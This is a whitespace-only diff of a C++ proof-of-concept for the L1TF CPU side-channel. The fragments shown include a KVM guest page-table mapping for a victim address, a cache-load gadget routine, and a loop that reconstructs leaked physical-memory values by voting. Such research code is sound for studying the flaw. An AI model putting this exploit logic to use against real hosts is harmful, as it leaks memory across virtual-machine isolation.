@@ -24,7 +24,7 @@
 /* This code is mapped into the guest at GPA 0. */
 static unsigned char guest_code[] alignas(4096) {
 #include "guest.inc"
-};
+                               };
 
 /* Hardcoded I/O port where we get cache line access timings from the guest */
 static const uint16_t guest_result_port = 0;
@@ -47,7 +47,7 @@ class page_table {
   const uint64_t page_large = 0x80; /* large page */
 
   const size_t tables_size_ = 4 * page_size;
-  uint64_t gpa_;		/* GPA of page tables */
+  uint64_t gpa_;    /* GPA of page tables */
   uint64_t *tables_;
 
   /*
@@ -92,7 +92,7 @@ public:
     /* Create a mapping for the victim address */
     pdpt()[1] = (gpa + 2*page_size) | page_pws;
     pd()[0] = (gpa + 3*page_size)| page_pws;
-    pt()[0] = 0;	/* Will be filled in by set_victim_pa */
+    pt()[0] = 0;  /* Will be filled in by set_victim_pa */
 
     kvm->add_memory_region(gpa, tables_size_, tables_);
   }
@@ -127,9 +127,9 @@ class l1tf_leaker {
   {
     auto cpuid_leafs = kvm_.get_supported_cpuid();
     auto ext_leaf = std::find_if(cpuid_leafs.begin(), cpuid_leafs.end(),
-				 [] (kvm_cpuid_entry2 const &leaf) {
-				   return leaf.function == 0x80000001U;
-				 });
+                                 [] (kvm_cpuid_entry2 const &leaf) {
+                                   return leaf.function == 0x80000001U;
+                                 });
 
     die_on(ext_leaf == cpuid_leafs.end(), "find(rdtscp leaf)");
 
@@ -197,8 +197,8 @@ public:
     regs = vcpu_.get_regs();
 
     die_on(state->exit_reason != KVM_EXIT_IO or
-	   state->io.port != guest_result_port or
-	   state->io.size != 4, "unexpected exit");
+           state->io.port != guest_result_port or
+           state->io.size != 4, "unexpected exit");
 
     return { (uint32_t)regs.r9, (uint32_t)regs.r11 };
   }
@@ -244,7 +244,7 @@ class cache_loader {
       uint64_t kva = target_kva_;
 
       if (kva == ~0ULL)
-	break;
+        break;
 
       /*
        * This relies on a deliberately placed cache load gadget in the
@@ -292,7 +292,7 @@ public:
       uint32_t mask = 1U << bit_pos;
 
       if (not (e.sureness & mask))
-	continue;
+        continue;
 
       (e.value & mask ? freq[bit_pos].second : freq[bit_pos].first)++;
     }
@@ -305,7 +305,7 @@ public:
 
     for (int bit_pos = 0; bit_pos < 32; bit_pos++) {
       if (freq[bit_pos].second > freq[bit_pos].first)
-	reconstructed |= (1U << bit_pos);
+        reconstructed |= (1U << bit_pos);
     }
 
     return reconstructed;
@@ -370,7 +370,7 @@ int main(int argc, char **argv)
        * value by voting.
        */
       for (int i = 0; i < 16; i++)
-	reconstructor.record_attempt(leaker.try_leak_dword(phys));
+        reconstructor.record_attempt(leaker.try_leak_dword(phys));
 
       leaked_value = reconstructor.get_most_likely_value();
     }
